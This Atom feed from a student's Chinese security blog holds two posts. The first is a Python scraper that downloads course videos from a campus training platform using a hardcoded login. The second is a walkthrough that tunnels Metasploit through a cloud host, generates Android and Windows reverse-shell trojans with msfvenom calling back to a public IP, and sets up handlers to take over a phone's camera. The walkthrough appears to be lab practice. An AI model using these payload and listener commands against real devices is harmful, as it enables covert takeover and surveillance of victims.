<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://sixi.fun</id>
    <title>一只小菜鸡</title>
    <updated>2019-06-14T14:04:49.710Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://sixi.fun"/>
    <link rel="self" href="https://sixi.fun/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://sixi.fun/images/avatar.png</logo>
    <icon>https://sixi.fun/favicon.ico</icon>
    <rights>All rights reserved 2019, 一只小菜鸡</rights>
    <entry>
        <title type="html"><![CDATA[我的第一个python爬虫]]></title>
        <id>https://sixi.fun/post/wo-de-di-yi-ge-python-pa-chong</id>
        <link href="https://sixi.fun/post/wo-de-di-yi-ge-python-pa-chong">
        </link>
        <updated>2019-06-14T07:52:52.000Z</updated>
        <content type="html"><![CDATA[<h4 id="初识python">初识python</h4>
<pre><code>  从大二开始接触python，那时候在实验室跟舍友做一个机器学习相关的项目，之后在期末的数据结构实训中也是运用python这门语言进行代码的编写，深刻的感受到了python的乐趣。此次爬虫是在这学期网络攻击与防御的课程中，学校跟e春秋合作推出了线上自学靶场平台，里面有许多网络攻击与防御相关的视频。于是产生了写一个爬虫将视频下载下来保存的想法。一方面保存学习资源，一方面练习编程技巧。
</code></pre>
<h4 id="艰难历程">艰难历程</h4>
<pre><code>  期初有想法是完全不会的，之前学习的语法也忘了，因为python是零零星星在学，没有一次系统的学习过。于是找到了一套完整的python全栈开发视频，将里面的爬虫模块的技术看了一半，便开始编写，由于只能在机房才能连上服务器，来回机房跑了几次，另外花了几节课才调试出来。其中还有许多不足，等技术成熟了再优化代码。
</code></pre>
<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/2.png" alt="">
<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/3.png" alt=""></p>
<h4 id="代码">代码</h4>
<pre><code>代码思路和实现过程，在面向对象的类里写的很清楚，就不阐述了。运用的模块也蛮简单，就requests请求模块，随机数模块random（），用于随机选择用户，登录获取用户登录信息的cookie，存在session对象中。实现用户的分布式爬取，反反爬虫。 用etree模块处理响应的数据，并用xpath提取下一步所需的信息，保存到列表中以供下一步访问。os模块用于创建课程相应文件夹和每一小节的名字并存储到相应文件夹。
</code></pre>
<h5 id="面向对象">面向对象</h5>
<p>（图片，便于浏览）
<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code1.png" alt="">
<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code2.png" alt="">
<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code3.png" alt="">
<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code4.png" alt="">
<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code5.png" alt="">
<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code6.png" alt=""></p>
<p>（由于移动端排版问题，源码放最后以便日后复制粘贴优化代码。）</p>
<p>以上代码是面向对象过程，但是在运行过程中有些问题导致报错，还没解决。但是思路是完全正确的，花了些时间把代码改成非面向对象版，代码完美运行：</p>
<h4 id="非面向对象版代码">非面向对象版代码</h4>
<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code7.png" alt="">
<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code8.png" alt="">
<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code9.png" alt="">
<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/code10.png" alt=""></p>
<pre><code>当然，虽然此次爬取到了所想要的资源，但是以上代码也有许多地方可以优化，如可以使用多线程，多进程技术进行爬取，在实际互联网上还要增加用户代理池，ip代理池等反反爬技术，以成功爬取所需的全部资源。美中不足的是本来想将网页一并爬取下来，但是如何处理每一张图片与连接的对应关系还没有思路，一个要学会了教程里的nosql数据库才能处理，所以这个问题先放一边。总共爬取了10个G的全部教学视频，收获还是不错的。
</code></pre>
<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/2019-06-14_160712.png" alt=""></p>
<hr>
<h4 id="总结">总结：</h4>
<pre><code>  经历了这次独立的开发一个项目（ps:苍蝇再小也是肉）,对 面向对象和非面向对象有了一个非常深刻的认知，刷新了我对编程的理解，因为以前基本上都是照着代码敲，没有这么深刻的思考。也算是一个从零到一的突破吧！会的东西还很少，继续按照教程来选修自己感兴趣的模块。
</code></pre>
<hr>
<p>吐槽一句，撸代码真的会让人秃头！！那些天思考实现方法，改bug，调程序，搞得我头皮发麻，整个人都是懵的。</p>
<pre><code>继续加油学习吧，这个年纪，迷茫的时候就只管学习就好。
</code></pre>
<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/2%20python/5.jpeg" alt=""></p>
<hr>
<h3 id="附源码">附源码</h3>
<p>（面向对象版）</p>
<pre><code class="language-python">import re
import requests
import random
from lxml import etree
import os
class Spider():
    def __init__(self):
        self.headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0&quot;}
        self.post_url = &quot;http://192.168.4.253/index.php/Login/login&quot;
        self.post_data = [{&quot;username&quot;: &quot;luochen&quot;, &quot;password&quot;: &quot;passwd&quot;}]
        self.Big_url = &quot;http://192.168.4.253/index.php/Study/studydetail?taskid={}&quot;

    def load(self):  # 登录获取第一页内容
        post_data = random.choice(self.post_data)
        session = requests.session()
        session.post(self.post_url, data=post_data, headers=self.headers)
        for i in range(1, 3):
            one_url=&quot;http://192.168.4.253/index.php/Study/listunderway?per_page={}&quot;
            response =session.get(one_url.format(i), headers=self.headers)
        return response.content.decode()

    def Big_url(self,first_data):  # 提取TaskID构造下一级url
        html = etree.HTML(first_data.content.decode())
        ret=html.xpath('//div[@class=&quot;taskimg&quot;]//a/@taskid')
        Big_url=[]
        for i in range(0, len(ret)):
            Big_url.append(&quot;http://192.168.4.253/index.php/Study/studydetail?taskid={}&quot;.format(ret[i]))
        return Big_url

    def Big_title(self,first_data):
        html = etree.HTML(first_data.content.decode())
        Bigtit_list=html.xpath('//div[@class=&quot;taskimg&quot;]//a/@title')
        return Bigtit_list


    def crate_big_file(self,Bigtit_list):       #创建相应文件夹
        for Bigtit in Bigtit_list:
            #print(Bigtit,Bighref)
            if os.path.exists(Bigtit)==False:#判断有无此文件夹
                os.mkdir(Bigtit)          #创建文件夹

    def load_little_url(self, bigurl):#进入二级url，得到课程的详细信息
        post_data = random.choice(self.post_data)
        session = requests.session()
        session.post(self.post_url, data=post_data, headers=self.headers)
        response = session.get(bigurl, headers=self.headers)
        return response.content.decode()

    # 获取三级url地址
    def Little_url(self,second_data):
        html = etree.HTML(second_data.content.decode())
        Little_url_list=html.xpath('//p[@class=&quot;itemTitle&quot; ]//a//@href')
        return Little_url_list

    def Little_title(self,second_data):
        html = etree.HTML(second_data.content.decode())
        Little_title_list=html.xpath('//p[@class=&quot;itemTitle&quot; ]//a/text()')
        return Little_title_list

    def load_third_url(self,little_url): #进入视频播放页面，发送请求获取数据
        post_data = random.choice(self.post_data)
        session = requests.session()
        session.post(self.post_url, data=post_data, headers=self.headers)
        response = session.get(little_url, headers=self.headers)
        return response.content.decode()

    def vedio_url(self,vedio_page_data):
        html = etree.HTML(vedio_page_data.content.decode())
        vedio_url=html.xpath('//vedio//source/@src')
        return vedio_url

    def save_vedio(self,vedio_url,bigtitle,little_title):
        post_data = random.choice(self.post_data)
        session = requests.session()
        session.post(self.post_url, data=post_data, headers=self.headers)
        response = session.get(vedio_url, headers=self.headers)
        little_title = re.sub(':', &quot; &quot;, little_title)  # 替换掉标题中的冒号
        path = bigtitle + &quot;\\&quot; + little_title + &quot;.mp4&quot;
        if os.path.exists(path) == False:
            with open(path,&quot;wb&quot;) as f:
                f.write(response.content)
                f.close()

    def seve_page(self,vedio_page_data,little_title,bigtitle):
        little_title = re.sub(':', &quot; &quot;, little_title)  # 替换掉标题中的冒号
        path = bigtitle + &quot;\\&quot; + little_title + &quot;.html&quot;
        with open(path,&quot;w&quot;,encoding=&quot;utf-8&quot;) as f:
            f.write(vedio_page_data)
            f.close()

    def run(self):
        # 登录发送请求获取响应
        first_data = self.load()
        # 爬取所有课程名字和url
        Bigurl_list=self.Big_url(first_data)
        Bigtit_list=self.Big_title(first_data)
        # 创建相应课程文件夹
        self.crate_big_file(Bigtit_list)
        #进入二级url
        for bigurl,bigtitle in zip(Bigurl_list,Bigtit_list):
            second_data=self.load_little_url(bigurl)
            # 获取每一小节名字和url
            Little_url_list=self.Little_url(second_data)
            Little_title_list=self.Little_title(second_data)
            print(Little_title_list,Little_url_list)
        #进入视频播放
            for little_url,little_title in zip(Little_url_list,Little_title_list):
                vedio_page_data=self.load_third_url(little_url)
                vedio_url=self.vedio_url(vedio_page_data)
                # 判断是视频还是文本教程
                if len(vedio_url)&gt;0:
                    try:
                    # 若是视频，提取视频地址，下载保存
                        self.save_vedio(vedio_url[0],bigtitle,little_title)
                    except Exception as e:
                        print(e)
                else:
                    try:
                    # 若是网页教程，保存为HTML格式文件
                        self.seve_page(vedio_page_data,bigtitle,little_title)
                    except Exception as e:
                        print(e)

if __name__ == '__main__':
    spider=Spider()
    spider.run()

</code></pre>
<hr>
<p>非面向对象版</p>
<pre><code class="language-python">import requests
import random
from lxml import etree
import os
import re
requests.adapters.DEFAULT_RETRIES = 5
headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0&quot;}
post_url = &quot;http://192.168.4.253/index.php/Login/login&quot;
post_data = [{&quot;username&quot;: &quot;luochen&quot;, &quot;password&quot;: &quot;passwd&quot;}]
Big_url = &quot;http://192.168.4.253/index.php/Study/studydetail?taskid={}&quot;
post_data = random.choice(post_data)
session = requests.session()
session.post(post_url, data=post_data, headers=headers)
for i in range(1, 3):
    one_url = &quot;http://192.168.4.253/index.php/Study/listunderway?per_page={}&quot;
    first_data = session.get(one_url.format(i), headers=headers)

    html = etree.HTML(first_data.content.decode())
    ret = html.xpath('//div[@class=&quot;taskimg&quot;]//a/@taskid')
    Big_url = []
    for i in range(0, len(ret)):
        Big_url.append(&quot;http://192.168.4.253/index.php/Study/studydetail?taskid={}&quot;.format(ret[i]))
    print(Big_url)

    Bigtit_list = html.xpath('//div[@class=&quot;taskimg&quot;]//a/@title')
    print(Bigtit_list)
    for Bigtit in Bigtit_list:
        # print(Bigtit,Bighref)
        if os.path.exists(Bigtit) == False:  # 判断有无此文件夹
            os.mkdir(Bigtit)

    for bigurl, bigtitle in zip(Big_url, Bigtit_list):
        second_data = session.get(bigurl, headers=headers)
        html = etree.HTML(second_data.content.decode())
        Little_title_list = html.xpath('//p[@class=&quot;itemTitle&quot; ]//a/text()')
        Little_url_list = html.xpath('//p[@class=&quot;itemTitle&quot; ]//a//@href')

        for little_url, little_title in zip(Little_url_list, Little_title_list):
            vedio_page_data = session.get(little_url, headers=headers)
            html = etree.HTML(vedio_page_data.content.decode())
            vedio_url = html.xpath('//video//source/@src')
            if len(vedio_url) &gt; 0:
                # ren = &quot;.*?(:)*?&quot;
                little_title= re.sub(':', &quot; &quot;, little_title)   #替换掉标题中的冒号
                print(bigtitle)
                path = bigtitle + &quot;\\&quot; + little_title + &quot;.mp4&quot;
                try:
                    vedio_data=session.get(vedio_url[0])
                    with open(path, 'wb') as output:
                        while True:
                            buffer = vedio_data.read(1024 * 256);
                            if not buffer:
                                break
                            # received += len(buffer)
                            output.write(buffer)
                        output.close()
                    print(little_title + &quot;.mp4下载成功&quot;)

                except Exception as e:
                    print(e)

        else:
            try:
                html_data = vedio_page_data.content
                fail_path = bigtitle + &quot;\\&quot; + little_title + &quot;.html&quot;
                with open(fail_path, &quot;w&quot;,encoding=&quot;utf-8&quot;) as f:
                    f.write(html_data)
                    f.close()
print(little_title + &quot;.html下载成功&quot;)
            except Exception as e:
                print(e)
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[用Metasploit反弹shell渗透目标手机或Windows设备]]></title>
        <id>https://sixi.fun/post/yong-metasploit-fan-dan-shell-shen-tou-mu-biao-shou-ji-huo-windows-she-bei</id>
        <link href="https://sixi.fun/post/yong-metasploit-fan-dan-shell-shen-tou-mu-biao-shou-ji-huo-windows-she-bei">
        </link>
        <updated>2019-06-14T01:55:21.000Z</updated>
        <summary type="html"><![CDATA[<h4 id="利用云主机的独立ip将本地的metasploit端口转发到外网上面去">利用云主机的独立IP，将本地的Metasploit端口转发到外网上面去。</h4>
]]></summary>
        <content type="html"><![CDATA[<h4 id="利用云主机的独立ip将本地的metasploit端口转发到外网上面去">利用云主机的独立IP，将本地的Metasploit端口转发到外网上面去。</h4>
<!-- more -->
<h4 id="话不多说先上原理图">话不多说先上原理图：</h4>
<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_095752.png" alt="原理"></p>
<h3 id="所用工具">所用工具：</h3>
<p>kali虚拟机，云主机，目标手机、电脑、MobaXterm</p>
<h3 id="选购云服务器">选购云服务器：</h3>
<p>考虑到低延迟等特性，买一台国内普通的云主机就可以了。云主机的话腾讯云有学生特惠价，蛮便宜的。本次是在Ubantu下面搭建的，所以购买好以后，安装一个Ubantu系统即可。</p>
<h3 id="安装终端">安装终端：</h3>
<p>安装MobaXterm远程连接主机，再开一个窗口连接本地虚拟机，以方便操作。
界面如下：
<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/zhongduan.png" alt=""></p>
<h3 id="环境搭建">环境搭建</h3>
<p>frp:本地主机网络与云主机的映射；
frps部署机,centos7为例,有外网固定ip,假设ip为1.1.1.1,后文简称frps
frpc客户机,kali 2.0为例,能访问互联网,后文简称frpc</p>
<h4 id="云主机配置">云主机配置：</h4>
<p>下载frp
Github项目地址:https://github.com/fatedier/frp
找到最新的releases下载，系统版本自行确认。
以下为云主机终端命令：</p>
<p>1、wget https://github.com/fatedier/frp/releases/download/v0.27.0/frp_0.27.0_linux_amd64.tar.gz</p>
<p>2、tar -zxvf frp_0.27.0_linux_amd64.tar.gz</p>
<p>3、cd frp_0.27.0_linux_amd64 /</p>
<p>4、rm -rf frpc*</p>
<h5 id="编写frps配置文件">编写frps配置文件</h5>
<p>vi frps.ini</p>
<p>内容如下：
<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/vim.png" alt=""></p>
<p>运行frps</p>
<p>运行frps,-c参数用于指定配置文件,在同级目录下的话 可以直接运行.frps
./frps -c ./frps.ini</p>
<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p3.png" alt=""></p>
<h3 id="kali的配置">Kali的配置</h3>
<p>配置SSH
允许root远程登陆
编辑ssh配置文件/etc/ssh/sshd_config</p>
<p><code>root@kali:~ vim /etc/ssh/sshd_config</code></p>
<p>在配置文件第一行前添加如下语句:
<code>PermitRootLogin yes</code>
<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p4.png" alt="">
重启SSH并设置为开机自启</p>
<p><code>root@kali:~ systemctl restart ssh</code>
<code>root@kali:~ systemctl enable ssh</code></p>
<p>验证SSH
本地使用终端连接虚拟机中的Kali，测试能否连接成功:
<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p5.png" alt=""></p>
<h4 id="下载frp">下载frp</h4>
<p>root@thp3:~#
wget https://github.com/fatedier/frp/releases/download/v0.27.0/frp_0.27.0_linux_amd64.tar.gz</p>
<p>root@thp3:~# tar -zxvf frp_0.27.0_linux_amd64.tar.gz</p>
<p>root@thp3:~# cd frp_0.27.0_linux_amd64/</p>
<p>root@thp3:~#~/frp_0.27.0_linux_amd64&gt; rm -rf frps*</p>
<h4 id="编写frpc配置文件">编写frpc配置文件</h4>
<p>root@thp3:~# cd frp_0.27.0_linux_amd64/ vi frpc.ini</p>
<p>内容如下:</p>
<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p6.png" alt=""></p>
<h4 id="运行frpc">运行frpc</h4>
<p>root@thp3:~/frp_0.27.0_linux_amd64# ./frpc</p>
<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p7.png" alt=""></p>
<p>基本配置完成，进行msf反向shell测试</p>
<h3 id="msf反向shell测试">msf反向shell测试</h3>
<p>现在来进行Metasploit下最基本的反向shell测试，看看能不能成功建立会话连接。</p>
<h4 id="生成payload">生成Payload</h4>
<p>使用msfvenom生成安卓手机APP木马
<code>msfvenom -p android/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=2333 R &gt; /lol.apk</code></p>
<p>使用msfvenom生成exe木马</p>
<p><code>root@kali:~&gt; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=2333 -f exe &gt; sqlsec.exe</code>
*注意：这里的1.1.1.1是外网云主机的IP地址，2333是映射到外网的端口，并且要将云主机的相应端口打开，如图：</p>
<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/server.png" alt=""></p>
<p>添加frpc规则
<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p6.png" alt=""></p>
<p>将Kali的4444端口转发到外网1.1.1.1的2333端口。
运行frps和frpc
分别在云主机和Kali下运行frps和frpc
<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p8.png" alt=""></p>
<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p9.png" alt=""></p>
<h4 id="msf监听反弹的shell">msf监听反弹的shell</h4>
<p>打开kali的msf:</p>
<pre><code>msf &gt; use exploit/multi/handler

msf exploit(multi/handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp

msf exploit(multi/handler) &gt; set LHOST 127.0.0.1
LHOST =&gt; 127.0.0.1

msf exploit(multi/handler) &gt; set LPORT 4444
LPORT =&gt; 4444

msf exploit(multi/handler) &gt; run
</code></pre>
<p>当目标主机成功安装之前生成的木马文件，便可以监听其设备：</p>
<h4 id="kali手机渗透">kali手机渗透</h4>
<pre><code>msf5 &gt; use exploit/multi/handler 
msf5 exploit(multi/handler) &gt; set payload android/meterpreter/reverse_tcp 
payload =&gt; android/meterpreter/reverse_tcp
msf5 exploit(multi/handler) &gt; set lhost 127.0.0.1
lhost =&gt; 127.0.0.1
msf5 exploit(multi/handler) &gt; set lport 4444
lport =&gt; 4444
msf5 exploit(multi/handler) &gt; run
</code></pre>
<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/p12.jpg" alt=""></p>
<p>手机安装：</p>
<p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/p10.jpg" alt=""></p>
<p>测试远程打开目标主机摄像头：
<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/p11.jpg" alt=""></p>
<p>在ssh连接时要打开云主机的相应端口：如
由于测试时没搭建博客，部分图片不全。</p>
<hr>
<p>革命尚未成功，同志仍需努力..............</p>
]]></content>
    </entry>
</feed>